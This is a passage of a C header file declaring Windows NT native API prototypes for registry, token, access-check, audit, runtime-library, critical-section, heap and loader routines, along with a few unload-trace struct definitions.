    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree,
    OUT OPTIONAL PVOID Buffer,
    IN ULONG BufferSize,
    IN BOOLEAN Asynchronous
    );



NTSTATUS
NTAPI
ZwLoadKey(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile
    );



NTSTATUS
NTAPI
ZwLoadKey2(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile,
    IN ULONG Flags
    );



NTSTATUS
NTAPI
ZwLoadKeyEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile,
    IN ULONG Flags,
    IN OPTIONAL HANDLE TrustClassKey
    );



NTSTATUS
NTAPI
ZwOpenKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQueryKey(
    IN HANDLE KeyHandle,
    IN KEY_INFORMATION_CLASS KeyInformationClass,
    OUT OPTIONAL PVOID KeyInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );



NTSTATUS
NTAPI
ZwQueryValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT OPTIONAL PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );



NTSTATUS
NTAPI
ZwQueryMultipleValueKey(
    IN HANDLE KeyHandle,
    IN OUT PKEY_VALUE_ENTRY ValueEntries,
    IN ULONG EntryCount,
    OUT PVOID ValueBuffer,
    IN OUT PULONG BufferLength,
    OUT OPTIONAL PULONG RequiredBufferLength
    );



NTSTATUS
NTAPI
ZwReplaceKey(
    IN POBJECT_ATTRIBUTES NewFile,
    IN HANDLE TargetHandle,
    IN POBJECT_ATTRIBUTES OldFile
    );



NTSTATUS
NTAPI
ZwRenameKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING  NewName
    );



NTSTATUS
NTAPI
ZwCompactKeys(
    IN ULONG Count,
    IN HANDLE KeyArray[]
            );



NTSTATUS
NTAPI
ZwCompressKey(
    IN HANDLE Key
            );



NTSTATUS
NTAPI
ZwRestoreKey(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle,
    IN ULONG Flags
    );



NTSTATUS
NTAPI
ZwSaveKey(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle
    );



NTSTATUS
NTAPI
ZwSaveKeyEx(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle,
    IN ULONG  Format
    );



NTSTATUS
NTAPI
ZwSaveMergedKeys(
    IN HANDLE HighPrecedenceKeyHandle,
    IN HANDLE LowPrecedenceKeyHandle,
    IN HANDLE FileHandle
    );



NTSTATUS
NTAPI
ZwSetValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN OPTIONAL ULONG TitleIndex,
    IN ULONG Type,
    IN OPTIONAL PVOID Data,
    IN ULONG DataSize
    );



NTSTATUS
NTAPI
ZwUnloadKey(
    IN POBJECT_ATTRIBUTES TargetKey
    );



NTSTATUS
NTAPI
ZwUnloadKey2(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN ULONG Flags
    );



NTSTATUS
NTAPI
ZwUnloadKeyEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN OPTIONAL HANDLE Event
    );



NTSTATUS
NTAPI
ZwSetInformationKey(
    IN HANDLE KeyHandle,
    IN KEY_SET_INFORMATION_CLASS KeySetInformationClass,
    IN PVOID KeySetInformation,
    IN ULONG KeySetInformationLength
    );



NTSTATUS
NTAPI
ZwQueryOpenSubKeys(
    IN POBJECT_ATTRIBUTES TargetKey,
    OUT PULONG  HandleCount
    );



NTSTATUS
NTAPI
ZwQueryOpenSubKeysEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN ULONG BufferLength,
    OUT PVOID Buffer,
    OUT PULONG RequiredSize
    );



NTSTATUS
NTAPI
ZwLockRegistryKey(
    IN HANDLE KeyHandle
    );



NTSTATUS
NTAPI
ZwLockProductActivationKeys(
    IN OUT OPTIONAL ULONG *pPrivateVer,
    OUT OPTIONAL ULONG *pSafeMode
    );



NTSTATUS
NTAPI
ZwAccessCheck (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );



NTSTATUS
NTAPI
ZwAccessCheckByType (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );



NTSTATUS
NTAPI
ZwAccessCheckByTypeResultList (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );



NTSTATUS
NTAPI
ZwCreateToken(
    OUT PHANDLE TokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN TOKEN_TYPE TokenType,
    IN PLUID AuthenticationId,
    IN PLARGE_INTEGER ExpirationTime,
    IN PTOKEN_USER User,
    IN PTOKEN_GROUPS Groups,
    IN PTOKEN_PRIVILEGES Privileges,
    IN OPTIONAL PTOKEN_OWNER Owner,
    IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
    IN OPTIONAL PTOKEN_DEFAULT_DACL DefaultDacl,
    IN PTOKEN_SOURCE TokenSource
    );



NTSTATUS
NTAPI
ZwCompareTokens(
    IN HANDLE FirstTokenHandle,
    IN HANDLE SecondTokenHandle,
    OUT PBOOLEAN Equal
    );



NTSTATUS
NTAPI
ZwOpenThreadToken(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    OUT PHANDLE TokenHandle
    );



NTSTATUS
NTAPI
ZwOpenThreadTokenEx(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    IN ULONG HandleAttributes,
    OUT PHANDLE TokenHandle
    );



NTSTATUS
NTAPI
ZwOpenProcessToken(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    OUT PHANDLE TokenHandle
    );



NTSTATUS
NTAPI
ZwOpenProcessTokenEx(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    OUT PHANDLE TokenHandle
    );



NTSTATUS
NTAPI
ZwDuplicateToken(
    IN HANDLE ExistingTokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN EffectiveOnly,
    IN TOKEN_TYPE TokenType,
    OUT PHANDLE NewTokenHandle
    );



NTSTATUS
NTAPI
ZwFilterToken (
    IN HANDLE ExistingTokenHandle,
    IN ULONG Flags,
    IN OPTIONAL PTOKEN_GROUPS SidsToDisable,
    IN OPTIONAL PTOKEN_PRIVILEGES PrivilegesToDelete,
    IN OPTIONAL PTOKEN_GROUPS RestrictedSids,
    OUT PHANDLE NewTokenHandle
    );



NTSTATUS
NTAPI
ZwImpersonateAnonymousToken(
    IN HANDLE ThreadHandle
    );



NTSTATUS
NTAPI
ZwQueryInformationToken (
    IN HANDLE TokenHandle,
    IN TOKEN_INFORMATION_CLASS TokenInformationClass,
    OUT PVOID TokenInformation,
    IN ULONG TokenInformationLength,
    OUT PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetInformationToken (
    IN HANDLE TokenHandle,
    IN TOKEN_INFORMATION_CLASS TokenInformationClass,
    IN PVOID TokenInformation,
    IN ULONG TokenInformationLength
    );



NTSTATUS
NTAPI
ZwAdjustPrivilegesToken (
    IN HANDLE TokenHandle,
    IN BOOLEAN DisableAllPrivileges,
    IN OPTIONAL PTOKEN_PRIVILEGES NewState,
    IN OPTIONAL ULONG BufferLength,
    OUT PTOKEN_PRIVILEGES PreviousState,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwAdjustGroupsToken (
    IN HANDLE TokenHandle,
    IN BOOLEAN ResetToDefault,
    IN PTOKEN_GROUPS NewState ,
    IN OPTIONAL ULONG BufferLength ,
    OUT PTOKEN_GROUPS PreviousState ,
    OUT PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwPrivilegeCheck (
    IN HANDLE ClientToken,
    IN OUT  PPRIVILEGE_SET RequiredPrivileges,
    OUT PBOOLEAN Result
    );



NTSTATUS
NTAPI
ZwAccessCheckAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ACCESS_MASK DesiredAccess,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );



NTSTATUS
NTAPI
ZwAccessCheckByTypeAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );



NTSTATUS
NTAPI
ZwAccessCheckByTypeResultListAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );



NTSTATUS
NTAPI
ZwAccessCheckByTypeResultListAndAuditAlarmByHandle (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN HANDLE ClientToken,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
ZwOpenObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN OPTIONAL PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN ACCESS_MASK GrantedAccess,
    IN OPTIONAL PPRIVILEGE_SET Privileges,
    IN BOOLEAN ObjectCreation,
    IN BOOLEAN AccessGranted,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
ZwPrivilegeObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN PPRIVILEGE_SET Privileges,
    IN BOOLEAN AccessGranted
    );


NTSTATUS
NTAPI
ZwCloseObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN BOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
ZwDeleteObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN BOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
ZwPrivilegedServiceAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN PUNICODE_STRING ServiceName,
    IN HANDLE ClientToken,
    IN PPRIVILEGE_SET Privileges,
    IN BOOLEAN AccessGranted
    );


NTSTATUS
NTAPI
ZwContinue (
    IN PCONTEXT ContextRecord,
    IN BOOLEAN TestAlert
    );


NTSTATUS
NTAPI
ZwRaiseException (
    IN PEXCEPTION_RECORD ExceptionRecord,
    IN PCONTEXT ContextRecord,
    IN BOOLEAN FirstChance
    );

// end_zwapi

ULONG
DbgPrint(
	IN PCH Format,
	...
	);

VOID NTAPI
DebugService2 (
    PVOID Arg1,
    PVOID Arg2,
    ULONG Service
    );


__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerAdd (
    LARGE_INTEGER Addend1,
    LARGE_INTEGER Addend2
    );

__inline
LARGE_INTEGER
NTAPI
RtlEnlargedIntegerMultiply (
    LONG Multiplicand,
    LONG Multiplier
    );

__inline
LARGE_INTEGER
NTAPI
RtlEnlargedUnsignedMultiply (
    ULONG Multiplicand,
    ULONG Multiplier
    );

__inline
ULONG
NTAPI
RtlEnlargedUnsignedDivide (
    IN ULARGE_INTEGER Dividend,
    IN ULONG Divisor,
    IN PULONG Remainder OPTIONAL
    );

__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerNegate (
    LARGE_INTEGER Subtrahend
    );

__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerSubtract (
    LARGE_INTEGER Minuend,
    LARGE_INTEGER Subtrahend
    );

LARGE_INTEGER
NTAPI
RtlExtendedMagicDivide (
    LARGE_INTEGER Dividend,
    LARGE_INTEGER MagicDivisor,
    CCHAR ShiftCount
    );

LARGE_INTEGER
NTAPI
RtlExtendedLargeIntegerDivide (
    LARGE_INTEGER Dividend,
    ULONG Divisor,
    PULONG Remainder
    );

LARGE_INTEGER
NTAPI
RtlLargeIntegerDivide (
    LARGE_INTEGER Dividend,
    LARGE_INTEGER Divisor,
    PLARGE_INTEGER Remainder
    );

LARGE_INTEGER
NTAPI
RtlExtendedIntegerMultiply (
    LARGE_INTEGER Multiplicand,
    LONG Multiplier
    );

__inline
LARGE_INTEGER
NTAPI
RtlConvertLongToLargeInteger (
    LONG SignedInteger
    );


__inline
LARGE_INTEGER
NTAPI
RtlConvertUlongToLargeInteger (
    ULONG UnsignedInteger
    );

__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerShiftLeft (
    LARGE_INTEGER LargeInteger,
    CCHAR ShiftCount
    );

__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerShiftRight (
    LARGE_INTEGER LargeInteger,
    CCHAR ShiftCount
    );


__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerArithmeticShift (
    LARGE_INTEGER LargeInteger,
    CCHAR ShiftCount
    );


__inline
BOOLEAN
NTAPI
RtlCheckBit (
    PRTL_BITMAP BitMapHeader,
    ULONG BitPosition
    );


BOOLEAN
NTAPI
RtlIsValidOemCharacter (
    IN OUT PWCHAR Char
    );

PIMAGE_NT_HEADERS
NTAPI
RtlpImageNtHeader(
    PVOID Base
    );

RTL_PATH_TYPE
RtlDetermineDosPathNameType_U(
	IN PCWSTR DosFileName
	);

PRTL_TRACE_DATABASE
RtlTraceDatabaseCreate (
    IN ULONG Buckets,
    IN SIZE_T MaximumSize OPTIONAL,
    IN ULONG Flags, // OPTIONAL in User mode
    IN ULONG Tag,   // OPTIONAL in User mode
    IN RTL_TRACE_HASH_FUNCTION HashFunction OPTIONAL
    );

BOOLEAN
RtlTraceDatabaseValidate (
    IN PRTL_TRACE_DATABASE Database
    );

BOOLEAN
RtlTraceDatabaseAdd (
    IN PRTL_TRACE_DATABASE Database,
    IN ULONG Count,
    IN PVOID * Trace,
    OUT PRTL_TRACE_BLOCK * TraceBlock OPTIONAL
    );

BOOLEAN
RtlTraceDatabaseFind (
    PRTL_TRACE_DATABASE Database,
    IN ULONG Count,
    IN PVOID * Trace,
    OUT PRTL_TRACE_BLOCK * TraceBlock OPTIONAL
    );

BOOLEAN
RtlTraceDatabaseEnumerate (
    PRTL_TRACE_DATABASE Database,
    OUT PRTL_TRACE_ENUMERATE Enumerate,
    OUT PRTL_TRACE_BLOCK * TraceBlock
    );

VOID
RtlTraceDatabaseLock (
    IN PRTL_TRACE_DATABASE Database
    );

VOID
RtlTraceDatabaseUnlock (
    IN PRTL_TRACE_DATABASE Database
    );

VOID
RtlpGetStackLimits (
    OUT PULONG_PTR LowLimit,
    OUT PULONG_PTR HighLimit
    );

NTSTATUS
NTAPI
RtlEnterCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
    );

NTSTATUS
NTAPI
RtlLeaveCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
    );

LOGICAL
NTAPI
RtlIsCriticalSectionLocked (
    IN PRTL_CRITICAL_SECTION CriticalSection
    );

LOGICAL
NTAPI
RtlIsCriticalSectionLockedByThread (
    IN PRTL_CRITICAL_SECTION CriticalSection
    );

ULONG
NTAPI
RtlGetCriticalSectionRecursionCount (
    IN PRTL_CRITICAL_SECTION CriticalSection
    );

LOGICAL
NTAPI
RtlTryEnterCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
    );

NTSTATUS
NTAPI
RtlInitializeCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
    );

VOID
NTAPI
RtlEnableEarlyCriticalSectionEventCreation(
    VOID
    );

NTSTATUS
NTAPI
RtlInitializeCriticalSectionAndSpinCount(
    PRTL_CRITICAL_SECTION CriticalSection,
    ULONG SpinCount
    );

ULONG
NTAPI
RtlSetCriticalSectionSpinCount(
    PRTL_CRITICAL_SECTION CriticalSection,
    ULONG SpinCount
    );

NTSTATUS
NTAPI
RtlDeleteCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
    );

NTSTATUS
NTAPI
LdrDisableThreadCalloutsForDll (
    IN PVOID DllHandle
    );

NTSTATUS
NTAPI
LdrLoadDll(
	IN OPTIONAL PWSTR DllPath,
	IN OPTIONAL PULONG DllCharacteristics,
	IN PUNICODE_STRING DllName,
	OUT PVOID *DllHandle
	);

NTSTATUS
NTAPI
LdrUnloadDll(
	IN PVOID DllHandle
	);

NTSTATUS
NTAPI
LdrGetDllHandle(
	IN OPTIONAL PWSTR DllPath,
	IN OPTIONAL PULONG DllCharacteristics,
	IN PUNICODE_STRING DllName,
	OUT PVOID *DllHandle
	);

NTSTATUS
NTAPI
LdrGetDllHandleEx(
	IN ULONG Flags,
	IN OPTIONAL PCWSTR DllPath,
	IN OPTIONAL PULONG DllCharacteristics,
	IN PUNICODE_STRING DllName,
	OUT OPTIONAL PVOID *DllHandle
	);

NTSTATUS
NTAPI
LdrGetDllHandleByMapping(
	IN PVOID Base,
	OUT PVOID *DllHandle
	);

NTSTATUS
NTAPI
LdrGetDllHandleByName(
	IN OPTIONAL PUNICODE_STRING BaseDllName,
	IN OPTIONAL PUNICODE_STRING FullDllName,
	OUT PVOID *DllHandle
	);

NTSTATUS
NTAPI
LdrAddRefDll(
	IN ULONG Flags,
	IN PVOID DllHandle
	);

NTSTATUS
NTAPI
LdrGetProcedureAddress(
	IN PVOID DllHandle,
	IN OPTIONAL PANSI_STRING ProcedureName,
	IN OPTIONAL ULONG ProcedureNumber,
	OUT PVOID *ProcedureAddress
	);

NTSTATUS
NTAPI
LdrGetProcedureAddressEx(
	IN PVOID DllHandle,
	IN OPTIONAL PANSI_STRING ProcedureName,
	IN OPTIONAL ULONG ProcedureNumber,
	OUT PVOID *ProcedureAddress,
	IN ULONG Flags
	);

NTSTATUS
NTAPI
LdrLockLoaderLock(
	IN ULONG Flags,
	OUT OPTIONAL ULONG *Disposition,
	OUT PVOID *Cookie
	);

NTSTATUS
NTAPI
LdrRelocateImage(
	IN PVOID NewBase,
	IN PSTR LoaderName,
	IN NTSTATUS Success,
	IN NTSTATUS Conflict,
	IN NTSTATUS Invalid
	);

NTSTATUS
NTAPI
LdrRelocateImageWithBias(
	IN PVOID NewBase,
	IN LONGLONG Bias,
	IN PSTR LoaderName,
	IN NTSTATUS Success,
	IN NTSTATUS Conflict,
	IN NTSTATUS Invalid
	);

PIMAGE_BASE_RELOCATION
NTAPI
LdrProcessRelocationBlock(
	IN ULONG_PTR VA,
	IN ULONG SizeOfBlock,
	IN PUSHORT NextOffset,
	IN LONG_PTR Diff
	);

BOOLEAN
NTAPI
LdrVerifyMappedImageMatchesChecksum(
	IN PVOID BaseAddress,
	IN SIZE_T NumberOfBytes,
	IN ULONG FileLength
	);

NTSTATUS
NTAPI
LdrQueryModuleServiceTags(
	IN PVOID DllHandle,
	OUT PULONG ServiceTagBuffer,
	IN OUT PULONG BufferSize
	);

NTSTATUS
NTAPI
LdrRegisterDllNotification(
	IN ULONG Flags,
	IN PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
	IN PVOID Context,
	OUT PVOID *Cookie
	);

NTSTATUS
NTAPI
LdrUnregisterDllNotification(
	IN PVOID Cookie
	);

ULONG
NTAPI
CsrGetProcessId(
	);

void
NTAPI
A_SHAFinal(
	PSHA_CTX Context,
	PULONG Result
	);


PVOID
NTAPI
A_SHAUpdate(
	IN OUT PSHA_CTX,
	IN PCHAR,
	IN UINT
	);

PVOID
NTAPI
A_SHAInit(
	IN OUT PSHA_CTX,
	OUT PVOID
	);

BOOLEAN
NTAPI
RtlDosPathNameToNtPathName_U(
    IN PCWSTR DosFileName,
    OUT PUNICODE_STRING NtFileName,
    OUT PWSTR *FilePart OPTIONAL,
    PVOID Reserved
    );

NTSTATUS
NTAPI
RtlDosPathNameToNtPathName_U_WithStatus(
    IN PCWSTR DosFileName,
    OUT PUNICODE_STRING NtFileName,
    OUT PWSTR *FilePart OPTIONAL,
    PVOID Reserved // Must be NULL
	);

PVOID
NTAPI
RtlAddVectoredExceptionHandler (
    IN ULONG First,
    IN PVECTORED_EXCEPTION_HANDLER Handler
    );

PVOID
NTAPI
RtlAddVectoredContinueHandler (
    IN ULONG First,
    IN PVECTORED_EXCEPTION_HANDLER Handler
    );

NTSTATUS
NTAPI
RtlAnalyzeProfile (
    VOID
    );

BOOLEAN
NTAPI
RtlCallVectoredContinueHandlers (
    IN PEXCEPTION_RECORD ExceptionRecord,
    IN PCONTEXT ContextRecord
    );

PVOID
RtlEncodePointer(
     PVOID Ptr
     );

PVOID
RtlDecodePointer(
     PVOID Ptr
     );

PVOID
RtlEncodeSystemPointer(
     PVOID Ptr
     );

PVOID
RtlDecodeSystemPointer(
     PVOID Ptr
     );

VOID
NTAPI
RtlDeleteResource(
    PRTL_RESOURCE Resource
    );

NTSTATUS
NTAPI
RtlDeleteSecurityObject(
    PSECURITY_DESCRIPTOR * ObjectDescriptor
    );

BOOLEAN
RtlDllShutdownInProgress(
    VOID
    );

ULONG
NTAPI
RtlGetCurrentProcessorNumber (
    VOID
    );

#define RTL_UNLOAD_EVENT_TRACE_NUMBER 16

typedef struct _RTL_UNLOAD_EVENT_TRACE {
    PVOID BaseAddress;   // Base address of dll
    SIZE_T SizeOfImage;  // Size of image
    ULONG Sequence;      // Sequence number for this event
    ULONG TimeDateStamp; // Time and date of image
    ULONG CheckSum;      // Image checksum
    WCHAR ImageName[32]; // Image name
} RTL_UNLOAD_EVENT_TRACE, *PRTL_UNLOAD_EVENT_TRACE;

typedef struct _RTL_UNLOAD_EVENT_TRACE64 {
    ULONGLONG BaseAddress;   // Base address of dll
    ULONGLONG SizeOfImage;  // Size of image
    ULONG Sequence;      // Sequence number for this event
    ULONG TimeDateStamp; // Time and date of image
    ULONG CheckSum;      // Image checksum
    WCHAR ImageName[32]; // Image name
} RTL_UNLOAD_EVENT_TRACE64, *PRTL_UNLOAD_EVENT_TRACE64;

typedef struct _RTL_UNLOAD_EVENT_TRACE32 {
    ULONG BaseAddress;   // Base address of dll
    ULONG SizeOfImage;  // Size of image
    ULONG Sequence;      // Sequence number for this event
    ULONG TimeDateStamp; // Time and date of image
    ULONG CheckSum;      // Image checksum
    WCHAR ImageName[32]; // Image name
} RTL_UNLOAD_EVENT_TRACE32, *PRTL_UNLOAD_EVENT_TRACE32;

PRTL_UNLOAD_EVENT_TRACE
NTAPI
RtlGetUnloadEventTrace(
    VOID
    );

NTSTATUS
NTAPI
RtlInitializeProfile(
    BOOLEAN KernelToo
    );

typedef BOOLEAN
(NTAPI *
PRTL_IS_THREAD_WITHIN_LOADER_CALLOUT)(
    VOID
    );

BOOLEAN
NTAPI
RtlIsThreadWithinLoaderCallout (
    VOID
    );

NTSTATUS
NTAPI
RtlSetLFHDebuggingInformation(
	PVOID LFHHeap,
	PHEAP_DEBUGGING_INFORMATION DebuggingInformation
	);

ULONG
NTAPI
RtlMultipleAllocateHeap (
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN SIZE_T Size,
    IN ULONG Count,
    OUT PVOID * Array
    );

ULONG
NTAPI
RtlMultipleFreeHeap (
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN ULONG Count,
    OUT PVOID * Array
    );

NTSTATUS
NTAPI
RtlNewSecurityObjectEx (
    IN PSECURITY_DESCRIPTOR ParentDescriptor OPTIONAL,
    IN PSECURITY_DESCRIPTOR CreatorDescriptor OPTIONAL,
    OUT PSECURITY_DESCRIPTOR * NewDescriptor,
    IN GUID *ObjectType OPTIONAL,
    IN BOOLEAN IsDirectoryObject,
    IN ULONG AutoInheritFlags,
    IN HANDLE Token,
    IN PGENERIC_MAPPING GenericMapping
    );

NTSTATUS
NTAPI
RtlNewSecurityObjectWithMultipleInheritance (
    IN PSECURITY_DESCRIPTOR ParentDescriptor OPTIONAL,
    IN PSECURITY_DESCRIPTOR CreatorDescriptor OPTIONAL,
    OUT PSECURITY_DESCRIPTOR * NewDescriptor,
    IN GUID **pObjectType OPTIONAL,
    IN ULONG GuidCount,
    IN BOOLEAN IsDirectoryObject,
    IN ULONG AutoInheritFlags,
    IN HANDLE Token,
    IN PGENERIC_MAPPING GenericMapping
    );

#if !defined(_WINDOWS_)
NTSTATUS
NTAPI
RtlSetHeapInformation (
    IN PVOID HeapHandle,
    IN HEAP_INFORMATION_CLASS HeapInformationClass,
    IN PVOID HeapInformation OPTIONAL,
    IN SIZE_T HeapInformationLength OPTIONAL
    );

NTSTATUS
NTAPI
RtlQueryHeapInformation (
    IN PVOID HeapHandle,
    IN HEAP_INFORMATION_CLASS HeapInformationClass,
    OUT PVOID HeapInformation OPTIONAL,
    IN SIZE_T HeapInformationLength OPTIONAL,
    OUT PSIZE_T ReturnLength OPTIONAL
    );
#endif

NTSTATUS
NTAPI
RtlQuerySecurityObject (
     PSECURITY_DESCRIPTOR ObjectDescriptor,
     SECURITY_INFORMATION SecurityInformation,
     PSECURITY_DESCRIPTOR ResultantDescriptor,
     ULONG DescriptorLength,
     PULONG ReturnLength
     );

NTSTATUS
NTAPI
RtlRegisterWait(
    OUT PHANDLE WaitHandle,
    IN  HANDLE  Handle,
    IN  WAITORTIMERCALLBACKFUNC Function,
    IN  PVOID Context,
    IN  ULONG  Milliseconds,
    IN  ULONG  Flags
    );

ULONG
NTAPI
RtlRemoveVectoredContinueHandler (
    IN PVOID Handle
    );

ULONG
NTAPI
RtlRemoveVectoredExceptionHandler (
    IN PVOID Handle
    );

NTSTATUS
NTAPI
RtlSetIoCompletionCallback(
    IN  HANDLE  FileHandle,
    IN  APC_CALLBACK_FUNCTION  CompletionProc,
    IN  ULONG Flags
    );

NTSTATUS
NTAPI
RtlSetSecurityObject(
    SECURITY_INFORMATION SecurityInformation,
    PSECURITY_DESCRIPTOR ModificationDescriptor,
    PSECURITY_DESCRIPTOR *ObjectsSecurityDescriptor,
    PGENERIC_MAPPING GenericMapping,
    HANDLE Token
    );

NTSTATUS
NTAPI
RtlSetSecurityObjectEx(
    IN SECURITY_INFORMATION SecurityInformation,
    IN PSECURITY_DESCRIPTOR ModificationDescriptor,
    IN OUT PSECURITY_DESCRIPTOR *ObjectsSecurityDescriptor,
    IN ULONG AutoInheritFlags,
